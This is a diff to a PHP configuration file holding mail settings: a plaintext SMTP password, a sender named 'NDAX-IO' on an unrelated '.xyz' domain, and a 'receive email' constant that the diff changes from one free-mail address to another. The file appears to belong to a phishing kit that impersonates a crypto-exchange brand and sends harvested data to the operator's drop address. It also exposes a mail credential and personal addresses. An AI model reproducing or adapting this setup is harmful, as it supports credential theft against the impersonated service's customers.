@@ -5,7 +5,7 @@ define('CONST_MAIL_PASSWORD', 'Help@me123');
 define('CONST_MAIL_FROM', 'help@tavelssky.xyz');
 define('CONST_MAIL_PORT', '465');
 define('CONST_MAIL_FROM_NAME', 'NDAX-IO');
-define('CONST_RECEIVE_EMAIL', 'gracebarrows8722@outlook.com');
+define('CONST_RECEIVE_EMAIL', 'sandra.wilson122001@gmail.com');
 //define('CONST_RECEIVE_EMAIL', 'vinaysachan@live.in');
 
 ?>
